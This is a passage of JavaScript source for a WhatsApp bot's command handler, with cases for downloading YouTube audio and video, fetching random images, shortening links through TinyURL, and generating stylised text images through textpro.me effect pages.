*┃🎲الوصف :* ${anulay.description}
*┃🌿 الرابط :* ${anulay.url}

┃اسم البوت : 📶 𝗕𝗢𝗧 𝗘𝗟𝗚𝗔𝗭𝗔𝗥 📶 

┗━━━━━━━━━❊`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'playmp3': case 'اغنيه': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!text) throw `مثال : ${prefix + command} انمي ناروتو`
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await ElgazarBot.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
break
case 'playmp4': case 'فيديو': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if(!text) throw `مثال : ${prefix + command} انمي ناروتو`
const xeonplaymp4 = require('./lib/ytdl2')
let ytsmp4 = require("youtube-yts")
        let xeonsearch13 = await ytsmp4(text)
        let anuvidoke4 = xeonsearch13.videos[0]
const pl2= await xeonplaymp4.mp4(anuvidoke4.url)
await ElgazarBot.sendMessage(m.chat,{
    document: {url:pl2.videoUrl},
    fileName: anuvidoke4.title + '.mp4',
    mimetype: 'video/mp4',
    contextInfo:{
        externalAdReply:{
            title:anuvidoke4.title,
            body: botname,
            thumbnail: await fetchBuffer(anuvidoke4.thumbnail),
            mediaType:2,
            mediaUrl:anuvidoke4.url,
        }

    },
},{quoted:m})
break
case 'ytmp3': case 'ytaudio': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`
const audio=await xeonaudp3.mp3(text)
await ElgazarBot.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
	    case 'ytmp3xx': case 'ytaudioxx': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                ElgazarBot.sendImage(m.chat, media.thumb, `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '128kbps'}`, m)
                ElgazarBot.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
case 'ytmp4': case 'ytvideo': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) throw `Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await ElgazarBot.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
break
            case 'ytmp4xx': case 'ytvideoxx': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                ElgazarBot.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `${themeemoji} Title : ${media.title}\n${themeemoji} File Size : ${media.filesizeF}\n${themeemoji} Url : ${isUrl(text)}\n${themeemoji} Ext : MP3\n${themeemoji} Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anupint = await pinterest(text)
                result = anupint[Math.floor(Math.random() * anupint.length)]
                ElgazarBot.sendMessage(m.chat, { image: { url: result }, caption: `${themeemoji} Media Url : `+result }, { quoted: m })
            }
            break
            case 'waifu': {
            	m.reply(mess.wait)
                anufux = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer13x = await getBuffer(anufux.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `animemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer13x,
                    caption: `Random Waifu`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'تطقيم': case 'طقم': {
                m.reply(mess.wait)
                let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
                let random = anucpp[Math.floor(Math.random() * anucpp.length)]
                ElgazarBot.sendMessage(m.chat, { image: { url: random.male }, caption: `ولد🙎🏻‍♂️` }, { quoted: m })
                ElgazarBot.sendMessage(m.chat, { image: { url: random.female }, caption: `بنت🙍🏻‍♀️` }, { quoted: m })
            }
	    break
            case 'coffee': case 'قهوه': {
            let buttons = [
                    {buttonId: `قهوه`, buttonText: {displayText: 'الصوره التاليه✨'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ ها هي قهوتك`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Enter Query Title'
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Enter Query Title'
		let { wikimedia } = require('./lib/scraper')
                anuwmedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
 case 'تقصير':{
   if(!q) return m.reply('link?')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  m.reply(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow2': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case '.': case '3dstone2': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rockart': case 'bloodglas': case 'halloween': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpinkart': case 'sand': case 'glue': case '1917': case 'leaves': case 'demon': {
             if (!q) throw `Example : ${prefix + command} ${global.ownername}`
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone2/.test(command)) link = 'https://textpro.me/create-a-3d-stone-text-effect-online-for-free-1073.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rockart/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/halloween/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpinkart/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'           
             let anutexpro = await maker.textpro(link, q)
                ElgazarBot.sendMessage(m.chat, { image: { url: anutexpro }, caption: `Made by ${global.botname}` }, { quoted: m })
             }
             break
case'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dbox':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break

case 'waterdrop':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
     `${q}`,])
    .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
    .catch((err) => console.log(err));
     break

case 'lion2':
  if(!q) throw `Use ${prefix + command} text`
  m.reply(mess.wait)
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break

case 'papercut':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
         .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case 'transformer':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
   
case 'harrypot':
       if(!q) throw `Use ${prefix + command} text|text`
       m.reply(mess.wait)
       teks1 = q.split("|")[0]
       teks2 = q.split("|")[1]
       maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
 .catch((err) => console.log(err));
 break

case 'neondevil':
      if(!q) throw `Use ${prefix + command} text`
      m.reply(mess.wait)
      maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
         .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
         .catch((err) => console.log(err));
         break

case '3dstone':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3davengers':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thunder':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'window':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

   case 'blackpinkneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-neon-light-blackpink-logo-text-effect-online-1081.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'graffiti':
   case 'grafiti':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pornhub2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'blackpink2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch2':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'glitch3':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dspace':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'lion':
if(!q) throw `Use ${prefix + command} text|text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case '3dneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'greenneon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
    
case 'bokeh':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   

case 'holographic':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break



case 'bear':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'wolf':

if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'joker':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'dropwater2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
   case 'summertime':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-summer-neon-light-text-effect-online-1076.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'neonlight2':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'thewall':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   
case 'natural':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 

case 'carbon':
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'pencil':
if(!q) throw`Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break

case 'textmaker': {
   
if (args.length < 1) throw `Example :\n${prefix + command} <name>`
if (args[0] === 'glitch') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [args[1]])
ElgazarBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else if (args[0] === 'glow') {
if (args.length < 2) throw `Example :\n${prefix + command + ' ' + args[0]} ${global.ownername}`
let teds = await thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [args[1]])
ElgazarBot.sendMessage(from, {image:{url:teds}, caption:"Done!"}, {quoted:m})
} else {
m.reply(`*Text Maker List :*\n•> glitch\n•> glow`)
}
}
break
case 'hoorror':{

     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Wait a moment while making the logo about 1 minute`) 
     console.log(anui)
    ElgazarBot.sendMessage(from, {image:{url:anui}, caption:"Here you go!"}, {quoted:m})
}
   break
case 'whitebear':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thunder2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-thunder-text-effect-online-881.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
   break
case 'neon':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-text-effect-online-882.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'matrix2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/matrix-style-text-effect-online-884.html", [
    `${q}`,])
  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sky':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
